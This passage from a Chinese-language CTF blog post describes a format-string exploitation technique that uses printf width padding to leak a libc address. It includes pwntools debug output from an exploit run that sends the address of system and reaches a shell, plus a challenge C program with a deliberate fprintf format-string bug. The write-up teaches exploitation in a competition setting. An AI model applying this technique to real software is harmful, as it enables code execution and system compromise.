class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0xfff bytes:</span><br><span class="line">    b&#x27; &#x27; * 0xfff</span><br><span class="line">[DEBUG] Received 0xfff bytes:</span><br><span class="line">    b&#x27; &#x27; * 0xfff</span><br><span class="line">[DEBUG] Received 0x4d9 bytes:</span><br><span class="line">    b&#x27;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            1. printf\n&#x27;</span><br><span class="line">    b&#x27;2. call\n&#x27;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    b&#x27;1\n&#x27;</span><br><span class="line">exp.py:30: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  r.sendline(&#x27;%s&#x27;)</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    b&#x27;%s\n&#x27;</span><br><span class="line">[DEBUG] Received 0xfff bytes:</span><br><span class="line">    b&#x27;Here: Here:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    &#x27;</span><br><span class="line">[DEBUG] Received 0xe37 bytes:</span><br><span class="line">    00000000  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │</span><br><span class="line">    *</span><br><span class="line">    00000e10  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 80  │    │    │    │   ·│</span><br><span class="line">    00000e20  89 5f de c1  7f 31 2e 20  70 72 69 6e  74 66 0a 32  │·_··│·1. │prin│tf·2│</span><br><span class="line">    00000e30  2e 20 63 61  6c 6c 0a                               │. ca│ll·│</span><br><span class="line">    00000e37</span><br><span class="line">libc-&gt;0x7fc1de40c000</span><br><span class="line">[*] &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] running in new terminal: [&#x27;/usr/bin/gdb&#x27;, &#x27;-q&#x27;, &#x27;./chal&#x27;, &#x27;11739&#x27;]</span><br><span class="line">[DEBUG] Created script for new terminal:</span><br><span class="line">    #!/usr/bin/python3</span><br><span class="line">    import os</span><br><span class="line">    os.execve(&#x27;/usr/bin/gdb&#x27;, [&#x27;/usr/bin/gdb&#x27;, &#x27;-q&#x27;, &#x27;./chal&#x27;, &#x27;11739&#x27;], os.environ)</span><br><span class="line">[DEBUG] Launching a new terminal: [&#x27;/usr/bin/x-terminal-emulator&#x27;, &#x27;-e&#x27;, &#x27;/tmp/tmpy7k3gpcp&#x27;]</span><br><span class="line">[-] Waiting for debugger: debugger exited! (maybe check /proc/sys/kernel/yama/ptrace_scope)</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    b&#x27;2\n&#x27;</span><br><span class="line">exp.py:38: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  r.sendline(str(hex(libc_base + libc.sym[&#x27;system&#x27;])))</span><br><span class="line">[DEBUG] Sent 0xf bytes:</span><br><span class="line">    b&#x27;0x7fc1de45e290\n&#x27;</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">$  </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="其他利用姿势"><a href="#其他利用姿势" class="headerlink" title="其他利用姿势"></a>其他利用姿势</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">FILE *fp;</span><br><span class="line"><span class="type">char</span> *buffer;</span><br><span class="line"><span class="type">uint64_t</span> i = <span class="number">0x8d9e7e558877</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">_Noreturn</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">/* Just to save some of your time */</span></span><br><span class="line">  <span class="type">uint64_t</span> *p;</span><br><span class="line">  p = &amp;p;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Chall */</span></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  buffer = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span> + <span class="number">1</span>);</span><br><span class="line">  fp = fopen(<span class="string">&quot;/dev/null&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">  fgets(buffer, <span class="number">0x1f</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> (i != <span class="number">0x8d9e7e558877</span>) &#123;</span><br><span class="line">    _exit(<span class="number">1337</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    i = <span class="number">1337</span>;</span><br><span class="line">    <span class="built_in">fprintf</span>(fp, buffer);</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>或者我们也可以去通过ogg和libc去getshell，也是同样的利用width去获取到栈上的地址，从而去进行覆盖，详细的可以去看文末的参考文章</p>
+<h2 id="缺陷"><a href="#缺陷" class="headerlink" title="缺陷"></a>缺陷</h2><p>这种方法本质上还是利用的printf对于参数利用的不规范从而导致的，虽然这种填充缓冲区来泄露栈上地址的方法很简洁，甚至只需要一次fmt就可以getshell，但缺乏普适性，缺点也很明显，输出字符的数量时一个libc地址，就比如一个0x123的地址，拿这种利用就会去尝试输出0x123个字符，从而去尝试泄露，但我们实际遇到的情况时一个libc地址，它往往很大，比如0x7fc1de40c000，而上文三字节每次只能输出0xfff个字节，就会导致有类似爆破的过程，会非常的慢，在实际比赛中，可能远程环境都掉了，脚本还没打通的情况，这里也是给出参考</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文探讨了对于格式化字符串的一种新利用，可能会在某些有限制的题目中作为非预期解。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>viol1t</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://viol1t.com/2024/11/01/%E4%B8%80%E7%A7%8D%E5%85%B3%E4%BA%8E%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%96%B0%E5%88%A9%E7%94%A8/">https://viol1t.com/2024/11/01/%E4%B8%80%E7%A7%8D%E5%85%B3%E4%BA%8E%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%96%B0%E5%88%A9%E7%94%A8/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2023 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/pwn/"># pwn</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2024/11/03/2024%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%88%9D%E8%B5%9Bwp/">2024年强网杯初赛wp</a>
+            
+            
+            <a class="next" rel="next" href="/2024/10/31/LLVM-PASS-PWN%EF%BC%9A%E4%BD%BF%E7%94%A8c-%E7%BC%96%E5%86%99exp/">LLVM PASS PWN：使用c++编写exp</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© viol1t | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
